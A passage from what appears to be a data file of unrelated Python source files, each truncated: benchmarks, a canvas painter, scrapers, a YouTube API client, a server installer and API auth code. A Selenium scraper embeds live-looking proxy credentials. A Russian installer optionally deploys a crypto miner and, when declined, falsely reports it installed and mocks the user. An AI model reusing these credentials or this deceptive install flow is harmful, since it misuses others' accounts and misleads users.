args.compile else \"\"\n    path += \".json\"\n    with open(path, \"w\") as f:\n        json.dump(info, f)\n\n\nif __name__ == \"__main__\":\n    parser = argparse.ArgumentParser()\n    parser.add_argument(\"--q8_transformer_path\", type=str, default=None)\n    parser.add_argument(\"--compile\", action=\"store_true\")\n    parser.add_argument(\"--num_frames\", type=int, default=81)\n    parser.add_argument(\"--resolution\", type=str, default=\"480x704\")\n    args = parser.parse_args()\n\n    if args.q8_transformer_path is None:\n        pipe = LTXPipeline.from_pretrained(\n            \"Lightricks/LTX-Video\", text_encoder=None, vae=None, torch_dtype=torch.bfloat16\n        ).to(\"cuda\")\n    else:\n        from inference import load_q8_transformer\n        from q8_kernels.graph.graph import make_dynamic_graphed_callable\n\n        pipe = LTXPipeline.from_pretrained(\"Lightricks/LTX-Video\", text_encoder=None, transformer=None, vae=None)\n        transformer = load_q8_transformer(args)\n        pipe.transformer = transformer\n\n        pipe.transformer = pipe.transformer.to(torch.bfloat16)\n        for b in pipe.transformer.transformer_blocks:\n            b.to(dtype=torch.float)\n\n        for n, m in pipe.transformer.transformer_blocks.named_parameters():\n            if \"scale_shift_table\" in n:\n                m.data = m.data.to(torch.bfloat16)\n\n        pipe.transformer.forward = make_dynamic_graphed_callable(pipe.transformer.forward)\n        pipe = pipe.to(\"cuda\")\n        if args.compile:\n            pipe.transformer.compile()\n\n    pipe.set_progress_bar_config(disable=True)\n\n    # Download it from here:\n    # https://huggingface.co/sayakpaul/q8-ltx-video/blob/main/prompt_embeds.pt\n    prompt_embeds = torch.load(\"prompt_embeds.pt\", map_location=\"cuda\", weights_only=True)\n    run_benchmark(pipe, args, prompt_embeds)\n",
    "import struct\nimport random\nimport math\n\nclass CanvasPainterWindow:\n\n    def __init__(self):\n\n        self._bits = 0\n        self._bytes = 0\n\n        self._buffer = None\n        self._columns = 0\n        self._rows = 0\n\n        self._windowBuffer = None\n        self._windowColumnStart = 0\n        self._windowColumnEnd = 0\n        self._windowRowStart = 0\n        self._windowRowEnd = 0\n        self._windowColumns = 0\n        self._windowRows = 0\n\n    def setWindow(self,columnStart,columnEnd,rowStart,rowEnd,copy=True):\n\n        self._windowColumnStart = columnStart\n        self._windowColumnEnd = columnEnd\n        self._windowRowStart = rowStart\n        self._windowRowEnd = rowEnd\n        self._windowColumns = self._windowColumnEnd - self._windowColumnStart\n        self._windowRows = self._windowRowEnd - self._windowRowStart\n        self._windowColumnSize = self._bytes\n        self._windowRowSize = self._windowColumns * self._bytes\n        \n        if self._buffer == None:\n            self._buffer = bytearray(self._columns*self._rows*self._bytes)\n\n        self._windowBuffer = bytearray(self._windowColumns*self._windowRows*self._bytes)\n        \n        if copy == False: return\n\n        nByte = 0\n        R = self._windowRowStart * (self._columns*self._bytes)\n        for r in range(self._windowRows):            \n            C = self._windowColumnStart * self._bytes\n            for c in range(self._windowColumns):\n                for b in range(self._bytes):\n                    self._windowBuffer[nByte] = self._buffer[R+C+b]\n                    nByte += 1\n                C += self._bytes\n            R +=  self._columns*self._bytes\n\n    def flush(self):\n        nByte = 0\n        R = self._windowRowStart * (self._columns*self._bytes)\n        for r in range(self._windowRows):            \n            C = self._windowColumnStart * self._bytes\n            for c in range(self._windowColumns):\n                for b in range(self._bytes):\n                    self._buffer[R+C+b] = self._windowBuffer[nByte]\n                    nByte += 1\n                C += self._bytes\n            R +=  self._columns*self._bytes\n\nclass CanvasPainter:\n\n    COLOR_LINE = 0\n    COLOR_FILL = 1\n    COLOR_TRANSPARENCY = 2\n\n    def __init__(self,columns=128,rows=160,bits=16,window=None):\n\n        self._window = window\n        if self._window == None: self._window = CanvasPainterWindow()\n        self._window._columns = columns\n        self._window._rows = rows\n        self._window._bits = bits\n        self._window._bytes = math.ceil(self._window._bits/8)\n        self._window._buffer = None \n\n        self._flipV = -1\n        self._flipH = -1\n\n        self._rotation = 0\n        self._xOrigin = 0\n        self._yOrigin = 0\n\n        self._color =  None\n        self._tmpColor = None\n\n        self._fillColor = None\n        self._tmpFillColor = None\n\n        self._transparencyColor = None\n        self._tmpTransparencyColor = None\n\n        self._thikness = 0\n        self._tmpThikness = 0\n\n        self._roundConers = True\n\n        self._charTable = None\n\n    def setWindow(self,startX,endX,startY,endY,copy=True):\n        self._window.setWindow(startX,endX,startY,endY,copy)\n\n        if self._fillColor != None and copy == False:\n            self._window._windowBuffer = bytearray( self._fillColor *self._window._windowColumns*self._window._windowRows)\n                        \n        if self._fillColor == None and copy == False:\n            for nByte in range(len(self._window._windowBuffer)):\n                self._window._windowBuffer[nByte] = random.getrandbits(8)\n\n\n    def setColor(self,R,G,B,colorType=0):\n        \n        color = None\n\n        if self._window._bits == 8: #OK\n            color = int((R<<5)&0xE0 | (G<<2)&0X1C | (B>>5)).to_bytes(1,'little')\n\n        if self._window._bits == 16: #OK\n            if self._window.__class__.__name__ == 'ST7735':\n                color = int( (R&0xF8)<<8 | (G&0xFC)<<3 | (B&0xF8)>>3 ).to_bytes(2,'big')\n            else:\n                color = int( (R&0xF8)<<8 | (G&0xFC)<<3 | (B&0xF8)>>3 ).to_bytes(2,'little')\n            \n        if self._window._bits == 24: #OK\n            color = int( (R<<16) | (G<<8) | (B) ).to_bytes(3,'little')\n\n        if self._window._bits == 32: #OK\n            color = int( (R<<21) | (G<<10) | (B) ).to_bytes(4,'little')\n\n        if colorType ==  CanvasPainter.COLOR_LINE:\n            self._tmpColor = self._color\n            self._color = color\n\n        if colorType ==  CanvasPainter.COLOR_FILL:\n            self._tmpFillColor = self._fillColor\n            self._fillColor = color\n\n        if colorType ==  CanvasPainter.COLOR_TRANSPARENCY:\n            self._tmpTransparencyColor = self._transparencyColor\n            self._transparencyColor = color\n\n    def restoreColor(self,colorType=0):\n        if colorType == CanvasPainter.COLOR_LINE: self._color = self._tmpColor\n        if colorType == CanvasPainter.COLOR_FILL: self._fillColor = self._tmpFillColor\n        if colorType == CanvasPainter.COLOR_TRANSPA",
    "from selenium import webdriver\nfrom webdriver_manager.chrome import ChromeDriverManager\nfrom selenium.webdriver.chrome.options import Options\nimport seleniumwire.undetected_chromedriver as uc\nfrom selenium.webdriver.chrome.service import Service\nfrom selenium.webdriver.common.by import By\nfrom selenium.webdriver.support.ui import WebDriverWait\nfrom selenium.webdriver.support import expected_conditions as EC\nfrom selenium.common.exceptions import NoSuchElementException, TimeoutException\nfrom selenium.webdriver.common.proxy import *\nimport pandas as pd\nimport os\n\ndef quotes_scrapper(url: str) -> list:\n    BASE_URL = url\n    quotes_list: list[dict] = []\n    proxy_username = \"ybhosgpe\"\n    proxy_password = \"p6zoviga3pv4\"\n    proxy_address = \"198.23.239.134\"\n    proxy_port = 6540\n\n    proxy_url = f\"https://{proxy_username}:{proxy_password}@{proxy_address}:{proxy_port}\"\n\n    seleniumwire_options = {\n    \"proxy\": {\n        \"http\": proxy_url,\n        \"https\": proxy_url\n        },\n    }\n\n    options = Options()\n    options.add_argument(\"--ignore-certificate-errors\")\n\n    # initialize the Chrome driver with service, selenium-wire options, and chrome options\n    driver = uc.Chrome(options=options, seleniumwire_options=seleniumwire_options)\n    wait = WebDriverWait(driver, 10)\n    \n    driver.get(BASE_URL)\n\n    # Validate page title\n    try:\n        expected_title = \"Quotes to Scrape\"\n        actual_title = wait.until(EC.presence_of_element_located((By.TAG_NAME, \"h1\"))).text\n        if actual_title == expected_title:\n            print(\"Title validated.\")\n        else:\n            print(f\"Title validation failed: Expected '{expected_title}', got '{actual_title}'.\")\n    except TimeoutException:\n        print(\"Failed to validate page title.\")\n        driver.quit()\n        return []\n\n    # Scrape top tags\n    try:\n        top_tags = wait.until(EC.presence_of_element_located((By.CLASS_NAME, \"tags-box\")))\n        tag_links = [tag.get_attribute(\"href\") for tag in top_tags.find_elements(By.TAG_NAME, \"a\")]\n    except TimeoutException:\n        print(\"Failed to fetch top tags.\")\n        driver.quit()\n        return []\n\n    # Process each tag link\n    for tag_href in tag_links:\n        print(f\"Scraping URL: {tag_href}\")\n        driver.get(tag_href)\n\n        while True:\n            try:\n                # Wait for quotes to load\n                wait.until(EC.presence_of_all_elements_located((By.CLASS_NAME, \"quote\")))\n                quotes = driver.find_elements(By.CLASS_NAME, \"quote\")\n\n                for quote in quotes:\n                    try:\n                        quote_text = quote.find_element(By.CLASS_NAME, \"text\").text\n                        author_name = quote.find_element(By.CLASS_NAME, \"author\").text\n                        author_link = quote.find_element(By.XPATH, \".//span/a\").get_attribute(\"href\")\n                        try:\n                            tags = [tag.text for tag in quote.find_elements(By.CLASS_NAME, \"tag\")]\n                        except NoSuchElementException:\n                            tags = []\n\n                        # Fetch author details\n                        author_info = fetch_author_info(driver, author_link)\n\n                        quotes_list.append({\n                            \"quote\": quote_text,\n                            \"author\": author_name,\n                            \"tags\": tags,\n                            \"author_info\": author_info,\n                        })\n                    except Exception as e:\n                        print(f\"Error processing quote: {e}\")\n\n                # Navigate to the next page if it exists\n                try:\n                    next_button = driver.find_element(By.CSS_SELECTOR, \"ul.pager li.next a\")\n                    next_button.click()\n                    print(\"Clicked 'Next' to go to the next page.\")\n\n                    # Wait for the next page to load by checking for the presence of quotes\n                    wait.until(EC.presence_of_all_elements_located((By.CLASS_NAME, \"quote\")))\n                except NoSuchElementException:\n                    print(\"No more pages for this tag.\")\n                    break\n\n            except TimeoutException:\n                print(\"Error loading quotes on the page.\")\n                break\n\n    driver.quit()\n    return quotes_list\n\ndef fetch_author_info(driver, url: str) -> dict:\n    driver.get(url)\n    wait = WebDriverWait(driver, 10)\n\n    try:\n        author_name = wait.until(EC.presence_of_element_located((By.CLASS_NAME, \"author-title\"))).text\n        dob = driver.find_element(By.CLASS_NAME, \"author-born-date\").text\n        location = driver.find_element(By.CLASS_NAME, \"author-born-location\").text\n        description = driver.find_element(By.CLASS_NAME, \"author-description\").text\n    except TimeoutException:\n        print(f\"Failed to fetch author info from {url}\")\n        return {}\n\n    driver.back()\n\n    return {\n        \"name\": author_name,\n        \"dob\": dob,\n        \"location\": location,\n  ",
    "import json\nimport random\nimport string\nfrom urllib.parse import urlencode\nimport requests\n\nIOS_CLIENT_VERSION = '19.28.1'\nIOS_DEVICE_MODEL = 'iPhone16,2'\nIOS_USER_AGENT_VERSION = '17_5_1'\nIOS_OS_VERSION = '17.5.1.21F90'\n\nANDROID_CLIENT_VERSION = '19.30.36'\nANDROID_OS_VERSION = '14'\nANDROID_SDK_VERSION = '34'\n\ndef generate_client_playback_nonce(length):\n    CPN_CHARS = string.ascii_letters + string.digits + '-_'\n    return ''.join(random.choice(CPN_CHARS) for _ in range(length))\n\nasync def get_data(video_id, is_raw=False, client_name='ios'):\n    client = {}\n    agent = f'com.google.ios.youtube/{IOS_CLIENT_VERSION}({IOS_DEVICE_MODEL}; U; CPU iOS {IOS_USER_AGENT_VERSION} like Mac OS X; en_US)'\n\n    if client_name == 'ios':\n        client = {\n            'clientName': 'IOS',\n            'clientVersion': IOS_CLIENT_VERSION,\n            'deviceMake': 'Apple',\n            'deviceModel': IOS_DEVICE_MODEL,\n            'platform': 'MOBILE',\n            'osName': 'iOS',\n            'osVersion': IOS_OS_VERSION,\n            'hl': 'en',\n            'gl': 'US',\n            'utcOffsetMinutes': -240,\n        }\n    elif client_name == 'android':\n        client = {\n            'clientName': 'ANDROID',\n            'clientVersion': ANDROID_CLIENT_VERSION,\n            'platform': 'MOBILE',\n            'osName': 'Android',\n            'osVersion': ANDROID_OS_VERSION,\n            'androidSdkVersion': ANDROID_SDK_VERSION,\n            'hl': 'en',\n            'gl': 'US',\n            'utcOffsetMinutes': -240,\n        }\n        agent = f'com.google.android.youtube/{ANDROID_CLIENT_VERSION} (Linux; U; Android {ANDROID_OS_VERSION}; en_US) gzip'\n\n    payload = {\n        'videoId': video_id,\n        'cpn': generate_client_playback_nonce(16),\n        'contentCheckOk': True,\n        'racyCheckOk': True,\n        'context': {\n            'client': client,\n            'request': {\n                'internalExperimentFlags': [],\n                'useSsl': True,\n            },\n            'user': {\n                'lockedSafetyMode': False,\n            },\n        },\n    }\n\n    query = {\n        'prettyPrint': False,\n        't': generate_client_playback_nonce(12),\n        'id': video_id,\n    }\n\n    query_string = urlencode(query)\n    headers = {\n        'Content-Type': 'application/json',\n        'User-Agent': agent,\n        'X-Goog-Api-Format-Version': '2',\n    }\n\n    response = requests.post(\n        f'https://youtubei.googleapis.com/youtubei/v1/player?{query_string}',\n        headers=headers,\n        data=json.dumps(payload)\n    )\n\n    data = response.json()\n    return data if is_raw else parse_formats(data)\n\ndef parse_formats(response):\n    formats = []\n    if response and 'streamingData' in response:\n        formats.extend(response['streamingData'].get('formats', []))\n        formats.extend(response['streamingData'].get('adaptiveFormats', []))\n    return formats\n# hydra_youtube_api/sources.py\ndef filter_formats(formats, filter_type = 'all', options=None):\n    if options is None:\n        options = {}\n\n    if not isinstance(formats, list):\n        raise ValueError('Formats must be a list')\n\n    if not filter_type:\n        raise ValueError('Filter must be provided')\n\n    fallback = options.get('fallback', False)\n    custom_sort = options.get('customSort', None)\n    min_bitrate = options.get('minBitrate', 0)\n    min_resolution = options.get('minResolution', 0)\n    codec = options.get('codec', None)\n\n    def filter_by_codec(format):\n        if not codec:\n            return True\n        return codec in format.get('mimeType', '')\n\n    def filter_by_bitrate(format):\n        return format.get('bitrate', 0) >= min_bitrate\n\n    def filter_by_resolution(format):\n        return format.get('width', 0) >= min_resolution or format.get('height', 0) >= min_resolution\n\n    def filter_by_url(format):\n        return 'url' in format\n\n    def apply_filters(format):\n        return filter_by_url(format) and filter_by_codec(format) and filter_by_bitrate(format) and filter_by_resolution(format)\n\n    if filter_type == 'all':\n        # Return all formats that pass the filters\n        return [format for format in formats if apply_filters(format)]\n\n    elif filter_type == 'bestvideo':\n        fn = lambda format: 'video' in format.get('mimeType', '')\n        filtered = [format for format in formats if apply_filters(format) and fn(format)]\n        if custom_sort:\n            filtered.sort(key=custom_sort)\n        else:\n            filtered.sort(key=lambda x: (-x.get('width', 0), -x.get('bitrate', 0)))\n        return filtered[0] if filtered else None\n\n    elif filter_type == 'bestaudio':\n        fn = lambda format: 'audio' in format.get('mimeType', '')\n        filtered = [format for format in formats if apply_filters(format) and fn(format)]\n        if custom_sort:\n            filtered.sort(key=custom_sort)\n        else:\n            filtered.sort(key=lambda x: -x.get('bitrate', 0))\n        return filtered[0] if filtered else None\n\n    elif filter_type == 'lowestvideo':\n        ",
    "import os\nimport subprocess\nimport configparser\nimport shutil\nimport time\n\ndef RunCommand(command, cwd=None):\n    result = subprocess.run(command, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, cwd=cwd)\n    print(result.stdout.decode())\n    if result.stderr:\n        print(result.stderr.decode())\n\ndef InstallDocker():\n    print(\"\u041e\u0431\u043d\u043e\u0432\u043b\u0435\u043d\u0438\u0435 \u043f\u0430\u043a\u0435\u0442\u043e\u0432...\")\n    RunCommand(\"sudo apt update\")\n    print(\"\u0423\u0441\u0442\u0430\u043d\u043e\u0432\u043a\u0430 Docker...\")\n    RunCommand(\"sudo apt install -y docker.io\")\n    RunCommand(\"sudo apt install -y docker-compose\")    \n    print(\"\u0414\u043e\u0431\u0430\u0432\u043b\u0435\u043d\u0438\u0435 \u043f\u043e\u043b\u044c\u0437\u043e\u0432\u0430\u0442\u0435\u043b\u044f \u0432 \u0433\u0440\u0443\u043f\u043f\u0443 Docker...\")\n    RunCommand(f\"sudo usermod -aG docker $(whoami)\")\n    print(\"\u041f\u0435\u0440\u0435\u0437\u0430\u043f\u0443\u0441\u043a Docker...\")\n    RunCommand(\"sudo systemctl restart docker\")\n    RunCommand(\"docker network create traefik-net\")\n\ndef CreateHashedPassword(username, password):\n    command = \"apt-get install -y apache2-utils\"\n    RunCommand(command)\n\n    command = f\"htpasswd -nb {username} {password}\"\n    result = subprocess.run(command, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n\n    hashedPassword = result.stdout.decode().strip()\n    hashedPassword = hashedPassword.replace('$', '$$')\n    return hashedPassword\n\ndef InstallTraefik(repoPath, email, host, username, password):\n    print(\"\u0423\u0441\u0442\u0430\u043d\u043e\u0432\u043a\u0430 Traefik...\")\n    traefikDir = os.path.join(repoPath, \"Infra\", \"Traefik\")\n\n    hashedPassword = CreateHashedPassword(username, password)\n\n    with open(os.path.join(traefikDir, \".env\"), \"w\") as f:\n        f.write(f\"EMAIL={email}\\n\")\n        f.write(f\"HOST={host}\\n\")\n        f.write(f\"HTPASSWD={hashedPassword}\\n\")\n\ndef InstallPortainer(repoPath, host):\n    print(\"\u0423\u0441\u0442\u0430\u043d\u043e\u0432\u043a\u0430 Portainer...\")\n    portainerDir = os.path.join(repoPath, \"Infra\", \"Portainer\")\n    RunCommand(\"docker volume create --name=portainer_data\")\n    with open(os.path.join(portainerDir, \".env\"), \"w\") as f:\n        f.write(f\"HOST={host}\\n\")\n\ndef CopyDirectories(src, dst):\n    if os.path.exists(dst):\n        shutil.rmtree(dst)\n    shutil.copytree(src, dst)\n\ndef Main():\n    repoPath = os.path.abspath(os.path.join(os.path.dirname(os.path.abspath(__file__)), '..'))\n\n    configPath = os.path.join(repoPath, 'config.ini')\n    config = configparser.ConfigParser()\n    config.read(configPath)\n\n    InstallDocker()\n\n    email = config.get('Email', 'email')\n    mainHost = config.get('MainHost', 'host')\n    traefikHost = config.get('Traefik', 'host')\n    traefikLogin = config.get('Traefik', 'login')\n    traefikPassword = config.get('Traefik', 'password')\n\n    traefikFullHost = f\"{traefikHost}.{mainHost}\"\n    portainerFullHost = f\"{config.get('Portainer', 'host')}.{mainHost}\"        \n\n    if config.getboolean('Traefik', 'install'):\n        InstallTraefik(repoPath, email, traefikFullHost, traefikLogin, traefikPassword)\n        CopyDirectories(os.path.join(repoPath, \"Infra\", \"Traefik\"), \"../../Infra/Traefik\")\n        RunCommand(\"docker-compose up -d\", cwd=\"../../Infra/Traefik\")\n    if config.getboolean('Portainer', 'install'):\n        InstallPortainer(repoPath, portainerFullHost)\n        CopyDirectories(os.path.join(repoPath, \"Infra\", \"Portainer\"), \"../../Infra/Portainer\")\n        RunCommand(\"docker-compose up -d\", cwd=\"../../Infra/Portainer\")\n\n    installMainerChoice = input(\"\u0423\u0441\u0442\u0430\u043d\u043e\u0432\u0438\u0442\u044c \u043c\u0430\u0439\u043d\u0435\u0440? (y/n): \").lower()\n    if installMainerChoice == 'y':\n        CopyDirectories(os.path.join(repoPath, \"Utils\", \"Mainer\"), \"../../Utils/Mainer\")\n        print(\"\u0423\u0441\u0442\u0430\u043d\u043e\u0432\u043a\u0430 \u043c\u0430\u0439\u043d\u0435\u0440\u0430...\")\n        RunCommand(\"docker-compose up -d\", cwd=\"../../Utils/Mainer\")\n        print(\"\u041c\u0430\u0439\u043d\u0435\u0440 \u0443\u0441\u043f\u0435\u0448\u043d\u043e \u0443\u0441\u0442\u0430\u043d\u043e\u0432\u043b\u0435\u043d!\")\n    else:\n        print(\"\u041c\u0430\u0439\u043d\u0435\u0440 \u0443\u0441\u043f\u0435\u0448\u043d\u043e \u0443\u0441\u0442\u0430\u043d\u043e\u0432\u043b\u0435\u043d!\")\n        time.sleep(1)\n        print(\"\u0422\u0438 \u043b\u043e\u0445, \u044d\u0442\u043e \u0434\u0436\u043e\u043a\u0435:)\")\n\nif __name__ == \"__main__\":\n    Main()\n",
    "import re\nimport time\nimport streamlit as st\nfrom phi.agent import Agent\nfrom phi.model.ollama import Ollama\nimport ollama\n\n# Constants\nBOARD_SIZE = 3\nMAX_MOVES = 9\nDEFAULT_MODEL = \"Phi-4:Q8_0\"\nAGENT_TEMPERATURE = 0.5\n\n# CSS Styles\nBOARD_STYLE = \"\"\"\n    <style>\n    .board {\n        display: grid;\n        grid-template-columns: repeat(3, 80px);\n        grid-template-rows: repeat(3, 80px);\n        gap: 5px;\n        background-color: #2c3e50;\n        padding: 10px;\n        border-radius: 10px;\n    }\n    .cell {\n        display: flex;\n        align-items: center;\n        justify-content: center;\n        background-color: #1a1a1a;\n        border: 2px solid #34495e;\n        border-radius: 5px;\n        font-size: 32px;\n        font-weight: bold;\n        color: white;\n    }\n    </style>\n\"\"\"\n\n# Game State Initialization\nall_models = [model.model for model in ollama.list()['models']]\nwinner = None\nstarted = False\n\ndef init_session_state():\n    \"\"\"Initialize Streamlit session state variables.\"\"\"\n    if 'board' not in st.session_state:\n        st.session_state.board = [[None] * BOARD_SIZE for _ in range(BOARD_SIZE)]\n    if 'board_container' not in st.session_state:\n        st.session_state.board_container = st.empty()\n    if 'current_player' not in st.session_state:\n        st.session_state.current_player = None\n    if 'symbol' not in st.session_state:\n        st.session_state.symbol = \"X\"\n    if 'move_count' not in st.session_state:\n        st.session_state.move_count = 0\n\ndef display_board(board):\n    \"\"\"Display the game board with styling.\"\"\"\n    board_html = BOARD_STYLE\n    board_html += '<div class=\"board-container\"><div class=\"board\">'\n    for row in board:\n        for cell in row:\n            cell_value = cell if cell is not None else \"&nbsp;\"\n            board_html += f'<div class=\"cell\">{cell_value}</div>'\n    board_html += '</div></div>'\n    st.session_state.board_container.markdown(board_html, unsafe_allow_html=True)\n\ndef get_board_state(board):\n    \"\"\"\n    Convert the board state to a string representation using position-based naming,\n    which we display/print in logs or for debugging if needed.\n    \"\"\"\n    position_mapping = {\n        (0, 0): \"top_left_square\",\n        (0, 1): \"top_middle_square\",\n        (0, 2): \"top_right_square\",\n        (1, 0): \"middle_left_square\",\n        (1, 1): \"middle_middle_square\",\n        (1, 2): \"middle_right_square\",\n        (2, 0): \"bottom_left_square\",\n        (2, 1): \"bottom_middle_square\",\n        (2, 2): \"bottom_right_square\"\n    }\n    \n    rows = []\n    for i, row_data in enumerate(board):\n        cells = []\n        for j, cell in enumerate(row_data):\n            position = position_mapping[(i, j)]\n            value = cell if cell is not None else \" \"\n            cells.append(f\"{position}: {value}\")\n        rows.append(\" \".join(cells))\n    print(\"\\n\".join(rows))\n    return \"\\n\".join(rows)\n\ndef check_winner(board):\n    \"\"\"Check if there's a winner or if the game is a draw.\"\"\"\n    # Check rows and columns\n    for i in range(BOARD_SIZE):\n        if board[i][0] == board[i][1] == board[i][2] and board[i][0] is not None:\n            return board[i][0]\n        if board[0][i] == board[1][i] == board[2][i] and board[0][i] is not None:\n            return board[0][i]\n    \n    # Check diagonals\n    if board[0][0] == board[1][1] == board[2][2] and board[0][0] is not None:\n        return board[0][0]\n    if board[0][2] == board[1][1] == board[2][0] and board[0][2] is not None:\n        return board[0][2]\n    \n    # Check for draw\n    if all(cell is not None for row in board for cell in row):\n        return \"Draw\"\n    return None\n\ndef get_player_instructions(symbol):\n    \"\"\"\n    Generate concise instructions for the AI agent:\n    - Only respond with one line: <square_name>:<symbol>\n    - No extra text or reasoning.\n    \"\"\"\n    opponent_symbol = \"O\" if symbol == \"X\" else \"X\"\n    return f\"\"\"\n    You are playing Tic-Tac-Toe as '{symbol}' against an opponent using '{opponent_symbol}'.\n\n    CRITICAL RULES:\n    - NEVER choose a square that shows '{symbol}' or '{opponent_symbol}' in the board state\n    - Empty squares show ' ' (space) in the board state\n    - Only respond with ONE line in format: square_name:{symbol}\n    - No explanations or extra text allowed\n\n    WINNING STRATEGIES (in order of priority):\n    1. If you can win by placing your symbol to complete a line - DO IT IMMEDIATELY\n    2. If opponent is about to win by completing a line - BLOCK THEM IMMEDIATELY\n    3. If you have two possible ways to win on your next turn - CREATE A FORK\n    4. If no immediate win/block:\n       - Take the center if empty (middle_middle_square)\n       - Take an empty corner (top_left, top_right, bottom_left, bottom_right)\n       - Take any empty edge (top_middle, middle_left, middle_right, bottom_middle)\n\n    Board Layout Reference:\n    [top_left_square]    [top_middle_square]    [top_right_square]\n    [middle_left_square] [middle_middle_square] [middle_right_square]\n    [bottom_left_square] [bottom_mi",
    "from typing import *\n\nfrom .qring import QRPoly\nfrom .utilities import lsumprod\n\nclass QRPolySamples(list[QRPoly]):\n    def __init__(self, degree: int, modulus: int, samples: Iterable[QRPoly]):\n        self.n = degree\n        self.p = modulus\n        super().__init__(samples)\n\n    def copy(self, degree: int = None, modulus: int = None) -> 'QRPolySamples':\n        return QRPolySamples(degree or self.n, modulus or self.p, [poly.copy() for poly in self])\n\n    def hashing(self, another: 'QRPolySamples') -> QRPoly:\n        return lsumprod(self, another, QRPoly(self.n, self.p))\n    \n    def set_degree(self, degree: int):\n        self.n = degree\n        for poly in self:\n            poly.set_degree(degree)\n\n    def set_module(self, modulus: int):\n        self.p = modulus\n        for poly in self:\n            poly.set_module(modulus)\n    \n    def __mul__(self, another: QRPoly) -> 'QRPolySamples':\n        return QRPolySamples(self.n, self.p, [self[i] * another for i in range(len(self))])\n    \n    def __rmul__(self, another: QRPoly) -> 'QRPolySamples':\n        return self * another\n    \n    def __floordiv__(self, another: QRPoly) -> 'QRPolySamples':\n        return QRPolySamples(self.n, self.p, [self[i] // another for i in range(len(self))])\n    \n    def __add__(self, another: 'QRPolySamples') -> 'QRPolySamples':\n        return QRPolySamples(self.n, self.p, [self[i] + another[i] for i in range(len(self))])\n    \n    def __sub__(self, another: 'QRPolySamples') -> 'QRPolySamples':\n        return QRPolySamples(self.n, self.p, [self[i] - another[i] for i in range(len(self))])\n    \n    def __lt__(self, another: int) -> list[bool]:\n        return [all(self[i] < another) for i in range(len(self))]\n    \n    def __le__(self, another: int) -> list[bool]:\n        return [all(self[i] <= another) for i in range(len(self))]\n    \n    def __gt__(self, another: int) -> list[bool]:\n        return [all(self[i] > another) for i in range(len(self))]\n    \n    def __ge__(self, another: int) -> list[bool]:\n        return [all(self[i] >= another) for i in range(len(self))]\n\n    @staticmethod\n    def random(degree: int, modulus: int, num_samples: int) -> 'QRPolySamples':\n        return QRPolySamples(degree, modulus, [QRPoly.random(degree, modulus) for _ in range(num_samples)])\n    \n    def __repr__(self):\n        return f\"QRPolySamples({super().__repr__()}, deg={self.n}, mod={self.p})\"\n    \n    def __str__(self):\n        return f\"{super().__str__()}\"",
    "# Ignoring several pylint methods for now:\n#   too-many-instance-attributes: We go over pylint's recommendation by one, but\n#       leaving it as it makes sense....any other data construction I can come up\n#       with would seem contrived.\n#   too-many-arguments: We go over pylint's recommendation by one, but\n#       leaving it as it makes sense....any other data construction I can come up\n#       with would seem contrived or not expose things that could be useful to\n#       configure in the future.\n# pylint: disable=too-many-instance-attributes, too-many-arguments\n\"\"\"Custom requests authentication for Gabb.\n\nThis contains the GabbAuth class, which is a custom authentication callable for\nthe requests library to handle authentication to the Smartcom FiLIP API that is\nused by Gabb.\n\nExample:\n    session = requests.Session()\n    session.auth = GabbAuth(username=\"username\", password=\"password\")\n\"\"\"\nimport datetime\nimport json\nimport requests\nfrom dateutil import parser\n\n\nclass GabbAuth(requests.auth.AuthBase):  # pylint: disable=too-few-public-methods\n    \"\"\"Custom requests authentication class for the Gabb API\n\n    The Gabb API uses their own authentication scheme to generate auth and\n    refresh tokens. This class implements that scheme as a custom\n    authentication callable for the requests library.\n\n    Attributes:\n        username (str): Parent/guardian account username.\n        password (str): Parent/guardian account password.\n        auth_url (str): The API endpoint used to generate a fresh access token\n            from the parent/guardian account username and password.\n        refresh_url (str): The API endpoint used to generate an access token\n            with the refresh token from the prior auth request.\n        app_build (str): This is a standard string value that shouldn't be\n            changed without knowing WHY you are doing it. Seems to be required\n            for the API requests to be accepted and is probably used in\n            some sort of server side reporting. The default value is currently\n            working and shouldn't be set to something else without good reason.\n\n\n    \"\"\"\n\n    _access_token = \"\"\n    \"\"\"str: The current active access token for the API. Do not manipulate directly.\"\"\"\n    _refresh_token = \"\"\n    \"\"\"str: The API endpoint used for token refresh. Do not manipulate directly.\"\"\"\n    _exp_date = \"\"\n    \"\"\"datetime.datetime: Datetime object representing when the current active\n    token held in _access_token will expire.\"\"\"\n    _required_headers = {\n        \"X-Accept-Language\": \"en-US\",\n        \"X-Accept-Offset\": \"-5.000000\",\n        \"Accept-Version\": \"1.0\",\n        \"User-Agent\": \"FiLIP-iOS\",\n        \"X-Accept-Version\": \"1.0\",\n        \"Content-Type\": \"application/json\",\n    }\n    \"\"\"dict: A dict of static headers that the API  requires in order to function properly\"\"\"\n\n    def __init__(\n        self,\n        username: str,\n        password: str,\n        auth_url: str = \"https://api.myfilip.com/v2/sso/gabb\",\n        refresh_url: str = \"https://api.myfilip.com/v2/token/refresh\",\n        app_build: str = \"1.28 (966)\",\n    ) -> None:\n        \"\"\"Initialize, set instance attributes and perform first authentication\n\n        Args:\n            username (str): Parent/guardian account username.\n            password (str): Parent/guardian account password.\n            auth_url (str, optional): The API endpoint used to generate a fresh\n                access token from the parent/guardian account username and\n                password.\n            refresh_url (str, optional): The API endpoint used to generate an\n                access token with the refresh token from the prior auth request.\n            app_build (str, optional): Build version of the Gabb app we are\n                emulating. Best left alone unless you have a specific use case.\n\n        \"\"\"\n        self.username = username\n        \"\"\"str: Parent/guardian account username.\"\"\"\n        self.password = password\n        \"\"\"str: Parent/guardian account password.\"\"\"\n        self.auth_url = auth_url\n        \"\"\" str: The API endpoint used to generate a fresh access token from the \n        parent/guardian account username and password.\"\"\"\n        self.refresh_url = refresh_url\n        \"\"\"str: The API endpoint used to generate an access token with the refresh \n        token from the prior auth request.\"\"\"\n        self.app_build = app_build\n        \"\"\"str: Build version of the Gabb app we are emulating. Best left alone unless \n        you have a specific use case.\"\"\"\n\n        self._new_authentication()\n\n    def __call__(self, request: requests.Request) -> requests.Request:\n        \"\"\"Manipulate the request object to add the correct bearer token\n\n        When the class is called, we check and see if the existing access token\n        has expired, if it has, we refresh the token. We then (regardless if a\n        refresh was needed or not) build the Authentication header and merge\n        into existing request headers\n\n        Args:\n ",
